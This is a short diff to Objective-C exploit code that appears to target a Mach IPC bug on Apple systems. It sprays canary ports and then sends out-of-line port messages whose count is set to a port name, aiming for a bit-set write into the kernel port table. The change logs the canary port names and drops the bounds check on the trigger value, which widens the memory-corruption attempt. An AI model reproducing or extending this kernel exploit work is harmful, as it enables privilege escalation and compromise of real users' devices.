@@ -413,6 +413,12 @@
     int aliveBefore = 0;
     for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveBefore++;
     [report appendFormat:@"canary before: %d/%d alive\n", aliveBefore, CANARY_N];
+    // Log port names so we can see the range
+    for (int i = 0; i < CANARY_N && i < 8; i++) {
+        [report appendFormat:@"  canary[%d] port=%u\n", i, canary[i]];
+    }
+    [self journal:[NSString stringWithFormat:@"canary_names sample: %u %u %u %u",
+                   canary[0], canary[1], canary[2], canary[3]]];
 
     // Trigger translate_receive using canary PORT NAMES as w2.
     // If w2 = count = port_name, the bit-set at table[port_name] hits
@@ -422,8 +428,8 @@
     int targeted = 0, targetedDead = 0;
     for (int i = 0; i < CANARY_N; i += 4) {
         if (canaryAlive[i] != 1) continue;
-        uint32_t w2 = (uint32_t)canary[i];  // the port name IS the table index
-        if (w2 == 0 || w2 > 4096) continue; // skip null / absurd names
+        uint32_t w2 = (uint32_t)canary[i];
+        if (w2 == 0) continue; // MACH_PORT_NULL — skip
         NSDictionary *tr = [self sendOOLPortsCount:w2 realEntries:64 port:port sendRight:port useSpray:NO];
         targeted++;
         [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u send_kr=%@ recv_kr=%@",
